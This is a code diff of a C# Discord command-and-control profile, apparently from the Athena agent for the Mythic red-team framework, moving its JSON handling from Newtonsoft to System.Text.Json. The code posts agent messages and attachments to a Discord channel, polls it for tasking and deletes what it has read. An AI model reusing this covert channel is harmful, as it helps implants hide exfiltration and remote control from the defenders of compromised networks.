@@ -6,13 +6,12 @@ using System.Threading.Tasks;
 using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Linq;
-using Newtonsoft.Json;
-using Newtonsoft.Json.Linq;
 using System.Net.Http;
 using System.Text;
 using System.Net.Http.Headers;
 using System.IO;
 using Athena.Models.Config;
+using System.Text.Json;
 
 namespace Profiles
 {
@@ -102,14 +101,13 @@ namespace Profiles
             }
         }
         //Dockerfile, config.json, c2_server.sh, C2_RPC_functions, dicsord.py
-        public async Task<string> Send(object obj)
+        public async Task<string> Send(string json)
         {
             try
             {
                 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                 //This will check to see if it needs to be encrypted first and convert the string properly. You can likely keep this here.
                 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-                string json = JsonConvert.SerializeObject(obj);
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
@@ -128,7 +126,7 @@ namespace Profiles
                     to_server = true
                 };
 
-                string strMsg = JsonConvert.SerializeObject(msg);
+                string strMsg = JsonSerializer.Serialize(msg);
                 if (strMsg.Length > 1950)
                 {
                     await SendAttachment(strMsg);
@@ -155,7 +153,7 @@ namespace Profiles
                             {
                                 if (attachment.filename.Contains(this.agent_guid) && !attachment.filename.EndsWith("server"))
                                 {
-                                    currentMessage = JsonConvert.DeserializeObject<MythicMessageWrapper>(await GetFileContentsAsync(attachment.url));
+                                    currentMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(await GetFileContentsAsync(attachment.url));
                                     if (currentMessage is not null && currentMessage.sender_id == this.agent_guid && currentMessage.to_server == false)
                                     {
                                         agentMessages.Add(currentMessage);
@@ -168,7 +166,7 @@ namespace Profiles
                         {
                             if (message.content.Contains(this.agent_guid))
                             {
-                                currentMessage = JsonConvert.DeserializeObject<MythicMessageWrapper>(message.content);
+                                currentMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(message.content);
                                 if (currentMessage.sender_id == this.agent_guid && currentMessage.to_server == false)
                                 {
                                     agentMessages.Add(currentMessage);
@@ -186,7 +184,8 @@ namespace Profiles
                 } while (agentMessages.Count() < 1);
 
                 //No concept of chunking yet, so just grab one
-                json = agentMessages.FirstOrDefault().message;
+                string strRes = agentMessages.FirstOrDefault().message;
+
                 DeleteMessages(msgToRemove);
 
                 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -194,17 +193,17 @@ namespace Profiles
                 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                 if (this.encrypted)
                 {
-                    return this.crypt.Decrypt(json);
+                    return this.crypt.Decrypt(strRes);
                 }
                 else
                 {
-                    if (String.IsNullOrEmpty(json))
+                    if (String.IsNullOrEmpty(strRes))
                     {
                         return json;
                     }
                     else
                     {
-                        return (await Misc.Base64Decode(json)).Substring(36);
+                        return (await Misc.Base64Decode(strRes)).Substring(36);
                     }
                 }
             }
@@ -222,7 +221,7 @@ namespace Profiles
               {"content" , msg }
             };
 
-            StringContent content = new StringContent(JsonConvert.SerializeObject(Payload), Encoding.UTF8, "application/json");
+            StringContent content = new StringContent(JsonSerializer.Serialize(Payload), Encoding.UTF8, "application/json");
             HttpResponseMessage res = await discordClient.PostAsync(url, content);
 
             return res.IsSuccessStatusCode ? true : false;
@@ -233,14 +232,14 @@ namespace Profiles
             var url = "https://discordapp.com/api/channels/" + this.ChannelID + "/" + "messages?limit=10";
             var res = await discordClient.GetAsync(url);
             string ResponseMessages = await res.Content.ReadAsStringAsync();
-            return JsonConvert.DeserializeObject<List<ServerDetails>>(ResponseMessages) ?? new List<ServerDetails>(); // eithe return the responses Or if it fails get a derisalised response AKA with d ata or no data
+            return JsonSerializer.Deserialize<List<ServerDetails>>(ResponseMessages) ?? new List<ServerDetails>(); // eithe return the responses Or if it fails get a derisalised response AKA with d ata or no data
         }
 
         public async Task<bool> SendAttachment2(string msg) //8mb by default, A file upload size limit applies to all files in a request 
         {
             try
             {
-                byte[] msgBytes = System.Text.Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(msg));
+                byte[] msgBytes = System.Text.Encoding.UTF8.GetBytes(JsonSerializer.Serialize(msg));
                 string url = "https://discord.com/api/channels/" + ChannelID + "/messages";
                 MultipartFormDataContent content = new MultipartFormDataContent();
                 ByteArrayContent fileContent = new ByteArrayContent(msgBytes);
@@ -274,7 +273,7 @@ namespace Profiles
         {
             try
             {
-                byte[] msgBytes = System.Text.Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(msg));
+                byte[] msgBytes = System.Text.Encoding.UTF8.GetBytes(JsonSerializer.Serialize(msg));
                 using (MemoryStream memStream = new MemoryStream(msgBytes)) //8mb max filesize
                 {
                     var URL = "https://discord.com/api/channels/" + ChannelID + "/messages";
